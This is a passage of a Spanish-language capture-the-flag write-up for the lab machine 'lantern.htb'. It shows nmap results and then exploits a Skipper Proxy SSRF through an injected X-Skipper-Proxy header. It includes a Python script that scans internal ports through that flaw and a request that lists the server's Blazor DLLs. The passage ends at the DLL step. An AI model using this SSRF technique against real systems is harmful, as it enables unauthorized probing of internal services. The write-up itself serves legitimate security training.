#hard #Linux 
### Ping

```python
ping -c 1 10.10.11.29
PING 10.10.11.29 (10.10.11.29) 56(84) bytes of data.
64 bytes from 10.10.11.29: icmp_seq=1 ttl=63 time=176 ms

--- 10.10.11.29 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 175.790/175.790/175.790/0.000 ms
```

### TTL = 63 Linux

### nmap

```python
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:c9:47:d5:89:f8:50:83:02:5e:fe:53:30:ac:2d:0e (ECDSA)
|_  256 d4:22:cf:fe:b1:00:cb:eb:6d:dc:b2:b4:64:6b:9d:89 (ED25519)
80/tcp   open  http    Skipper Proxy
|_http-title: Did not follow redirect to http://lantern.htb/
|_http-server-header: Skipper Proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Length: 207
|     Content-Type: text/html; charset=utf-8
|     Date: Sat, 17 Aug 2024 19:23:16 GMT
|     Server: Skipper Proxy
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Length: 225
|     Content-Type: text/html; charset=utf-8
|     Date: Sat, 17 Aug 2024 19:23:10 GMT
|     Location: http://lantern.htb/
|     Server: Skipper Proxy
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://lantern.htb/">http://lantern.htb/</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|     Content-Type: text/html; charset=utf-8
|     Date: Sat, 17 Aug 2024 19:23:10 GMT
|_    Server: Skipper Proxy
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 500 Internal Server Error
|     Connection: close
|     Content-Type: text/plain; charset=utf-8
|     Date: Sat, 17 Aug 2024 19:23:15 GMT
|     Server: Kestrel
|     System.UriFormatException: Invalid URI: The hostname could not be parsed.
|     System.Uri.CreateThis(String uri, Boolean dontEscape, UriKind uriKind, UriCreationOptions& creationOptions)
|     System.Uri..ctor(String uriString, UriKind uriKind)
|     Microsoft.AspNetCore.Components.NavigationManager.set_BaseUri(String value)
|     Microsoft.AspNetCore.Components.NavigationManager.Initialize(String baseUri, String uri)
|     Microsoft.AspNetCore.Components.Server.Circuits.RemoteNavigationManager.Initialize(String baseUri, String uri)
|     Microsoft.AspNetCore.Mvc.ViewFeatures.StaticComponentRenderer.<InitializeStandardComponentServicesAsync>g__InitializeCore|5_0(HttpContext httpContext)
|     Microsoft.AspNetCore.Mvc.ViewFeatures.StaticC
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Length: 0
|     Connection: close
|     Date: Sat, 17 Aug 2024 19:23:21 GMT
|     Server: Kestrel
|   Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|     Connection: close
|     Date: Sat, 17 Aug 2024 19:23:15 GMT
|     Server: Kestrel
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Content-Length: 0
|     Connection: close
|     Date: Sat, 17 Aug 2024 19:23:21 GMT
|     Server: Kestrel
|   SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|     Connection: close
|     Date: Sat, 17 Aug 2024 19:23:37 GMT
|_    Server: Kestrel
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=8/17%Time=66C0F89E%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,18F,"HTTP/1\.0\x20302\x20Found\r\nContent-Length:\x20225\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nDate:\x20Sat,\x2017\x20A
SF:ug\x202024\x2019:23:10\x20GMT\r\nLocation:\x20http://lantern\.htb/\r\nS
SF:erver:\x20Skipper\x20Proxy\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>
SF:\n<title>Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\
SF:x20should\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x
SF:20URL:\x20<a\x20href=\"http://lantern\.htb/\">http://lantern\.htb/</a>\
SF:.\x20If\x20not,\x20click\x20the\x20link\.\n")%r(HTTPOptions,A5,"HTTP/1\
SF:.0\x20200\x20OK\r\nAllow:\x20HEAD,\x20GET,\x20OPTIONS\r\nContent-Length
SF::\x200\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nDate:\x20Sat,
SF:\x2017\x20Aug\x202024\x2019:23:10\x20GMT\r\nServer:\x20Skipper\x20Proxy
SF:\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request")%r(FourOhFourRequest,162,"HTTP/1\.0\x20404\x20
SF:Not\x20Found\r\nContent-Length:\x20207\r\nContent-Type:\x20text/html;\x
SF:20charset=utf-8\r\nDate:\x20Sat,\x2017\x20Aug\x202024\x2019:23:16\x20GM
SF:T\r\nServer:\x20Skipper\x20Proxy\r\n\r\n<!doctype\x20html>\n<html\x20la
SF:ng=en>\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>\n<p>T
SF:he\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20server\.\
SF:x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20check\x2
SF:0your\x20spelling\x20and\x20try\x20again\.</p>\n")%r(GenericLines,67,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20ch
SF:arset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(He
SF:lp,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plai
SF:n;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reques
SF:t")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.94SVN%I=7%D=8/17%Time=66C0F8A4%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,114E,"HTTP/1\.1\x20500\x20Internal\x20Server\x20Error\r\nCo
SF:nnection:\x20close\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Date:\x20Sat,\x2017\x20Aug\x202024\x2019:23:15\x20GMT\r\nServer:\x20Kes
SF:trel\r\n\r\nSystem\.UriFormatException:\x20Invalid\x20URI:\x20The\x20ho
SF:stname\x20could\x20not\x20be\x20parsed\.\n\x20\x20\x20at\x20System\.Uri
SF:\.CreateThis\(String\x20uri,\x20Boolean\x20dontEscape,\x20UriKind\x20ur
SF:iKind,\x20UriCreationOptions&\x20creationOptions\)\n\x20\x20\x20at\x20S
SF:ystem\.Uri\.\.ctor\(String\x20uriString,\x20UriKind\x20uriKind\)\n\x20\
SF:x20\x20at\x20Microsoft\.AspNetCore\.Components\.NavigationManager\.set_
SF:BaseUri\(String\x20value\)\n\x20\x20\x20at\x20Microsoft\.AspNetCore\.Co
SF:mponents\.NavigationManager\.Initialize\(String\x20baseUri,\x20String\x
SF:20uri\)\n\x20\x20\x20at\x20Microsoft\.AspNetCore\.Components\.Server\.C
SF:ircuits\.RemoteNavigationManager\.Initialize\(String\x20baseUri,\x20Str
SF:ing\x20uri\)\n\x20\x20\x20at\x20Microsoft\.AspNetCore\.Mvc\.ViewFeature
SF:s\.StaticComponentRenderer\.<InitializeStandardComponentServicesAsync>g
SF:__InitializeCore\|5_0\(HttpContext\x20httpContext\)\n\x20\x20\x20at\x20
SF:Microsoft\.AspNetCore\.Mvc\.ViewFeatures\.StaticC")%r(Help,78,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20cl
SF:ose\r\nDate:\x20Sat,\x2017\x20Aug\x202024\x2019:23:15\x20GMT\r\nServer:
SF:\x20Kestrel\r\n\r\n")%r(HTTPOptions,6F,"HTTP/1\.1\x20200\x20OK\r\nConte
SF:nt-Length:\x200\r\nConnection:\x20close\r\nDate:\x20Sat,\x2017\x20Aug\x
SF:202024\x2019:23:21\x20GMT\r\nServer:\x20Kestrel\r\n\r\n")%r(RTSPRequest
SF:,87,"HTTP/1\.1\x20505\x20HTTP\x20Version\x20Not\x20Supported\r\nContent
SF:-Length:\x200\r\nConnection:\x20close\r\nDate:\x20Sat,\x2017\x20Aug\x20
SF:2024\x2019:23:21\x20GMT\r\nServer:\x20Kestrel\r\n\r\n")%r(SSLSessionReq
SF:,78,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConn
SF:ection:\x20close\r\nDate:\x20Sat,\x2017\x20Aug\x202024\x2019:23:37\x20G
SF:MT\r\nServer:\x20Kestrel\r\n\r\n")%r(TerminalServerCookie,78,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20clo
SF:se\r\nDate:\x20Sat,\x2017\x20Aug\x202024\x2019:23:37\x20GMT\r\nServer:\
SF:x20Kestrel\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 17 15:24:47 2024 -- 1 IP address (1 host up) scanned in 118.91 seconds
```

### Enumeración del puerto 80 (http)

![[Pasted image 20240822121950.png]]

`vacancies`
si vamos al apartado de http://lantern.htb/vacancies podemos ver que están contratando ingenieros y podemos subir un currículum 
![[Pasted image 20240822122149.png]]

demás, en el resultado del análisis anterior de Nmap para el puerto 80, vemos que se menciona "Skipper Proxy". Skipper Proxy es un servidor proxy inverso y un enrutador HTTP integrado en Go. Está diseñado para administrar el tráfico en arquitecturas web modernas, manejando solicitudes HTTP y enrutandolas a los servicios backend apropiados según varias reglas y configuraciones:  
 
 ```python 
Enrutamiento de tráfico : enruta las solicitudes HTTP entrantes a diferentes servicios backend o microservicios en función de reglas definidas en la configuración o dinámicamente en el código.  

Equilibrio de carga : puede distribuir el tráfico entrante entre múltiples servidores backend para equilibrar la carga y mejorar el rendimiento.  

Redirección : Skipper puede manejar redirecciones HTTP, como se muestra en los resultados del análisis a donde redirige http://lantern.htb/, lo que indica que es probable que el proxy esté configurado para reenviar tráfico a este dominio.  

Funciones de seguridad : admite varios mecanismos de seguridad como terminación SSL/TLS, autenticación y control de acceso.

```

### Vulnerabilidades
Busque un poco en Google y el primer resultado arroja una vulnerabilidad SSRF

| CVE-XXXX-XXXXX | Nombre de la vulnerabilidad | Tipo | Nivel          | Link                                              |
| -------------- | --------------------------- | ---- | -------------- | ------------------------------------------------- |
| CVE-2022-38580 | Skipper Proxy               | SSRF | `9.8 CRITICAL` | [link](https://www.exploit-db.com/exploits/51111) |
|                |                             |      |                |                                                   |
|                |                             |      |                |                                                   |

### Explotación SSRF
vamos a realizar una  carga de nuestro resumen y la interceptaremos con el `burpsuite` para analizar la petición debito a que este campo es el que se relaciona directamente con el parámetro que queremos analizar
![[Pasted image 20240822143808.png]]

``BurpSuite``
al intentar hacer una petición agregando el parametro `X-Skipper-Proxy` y apuntando al local host por el puerto `9999` podemos ver que la petición nos responde con un `503 servidor no disponible` esto me hace pensar que se esta ejecutando correctamente la vulnerabilidad `SSRF` solo que estamos apuntando al lugar incorrecto ya que no conocemos un puerto disponible.
![[Pasted image 20240822143535.png]]

### script SSRF
vamos a crear un script que realiza un escaneo de puertos en el servidor local (`127.0.0.1`) a través de un ataque de SSRF (Server-Side Request Forgery) utilizando un proxy HTTP. Intenta acceder a diferentes puertos comunes y evalúa las respuestas del servidor para determinar si los puertos están abiertos o si hay alguna respuesta significativa (como redirecciones o errores).

```python
import requests
from pwn import *

bar = log.progress("Enumerate ports for local network via SSRF")

# Target host and headers
target_host = "http://lantern.htb/"
headers = {
    "Host": "lantern.htb",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://lantern.htb/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "close",
}

# List of common ports to enumerate
common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 3389, 8080, 8443, 5000, 8000]

# Function to check a port via SSRF
def check_port(port):
    bar.status(f"Testing port {port} for 127.0.0.1 ...")
    headers["X-Skipper-Proxy"] = f"http://127.0.0.1:{port}"
    try:
        response = requests.get(target_host, headers=headers)
        if response.status_code == 200:
            print(f"Port {port} is open - Response: {response.status_code}")
        elif response.status_code == 302:
            print(f"Port {port} redirect - Response: {response.status_code}")
        elif response.status_code == 403:
            print(f"Port {port} Forbidden - Response: {response.status_code}")
        elif response.status_code == 404:
            print(f"Port {port} Not Found - Response: {response.status_code}")
        elif response.status_code == 500:
            print(f"Port {port} Internal Server Error - Response: {response.status_code}")
        elif response.status_code == 503:
            print(f"Port {port} Internal Server Error - Response: {response.status_code}")
        else:
            print(f"Port {port} returned status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Port {port} is closed or not reachable - Error: {e}")

# Enumerate through common ports
for port in common_ports:
    check_port(port)
    
bar.success("Finish!")
```

`puertos abiertos SSRF`
el resultado de este script nos muestra que existen 3 puertos abiertos. de manera interna en la maquina (80,5000,8000)
![[Pasted image 20240822144740.png]]

### Burpsuite
despues de hacer una larga investigación sabemos que el puerto 5000 es el puerto predeterminado para `blazor` la tecnología que esta utilizando la web por lo cual vamos a apuntar a este puerto y haciendo una petición a la ruta `_framework/blazor.boot.json` podemos ver las dll del servidor correspondiente. en este caso solo encontramos una dll personalizada `"InternaLantern.dll": "sha256-pblWkC\/PhCCSxn1VOi3fajA0xS3mX\/\/RC0XvAE\/n5cI=`
![[Pasted image 20240822145612.png]]

`dll`

![[Pasted image 20240822150407.png]]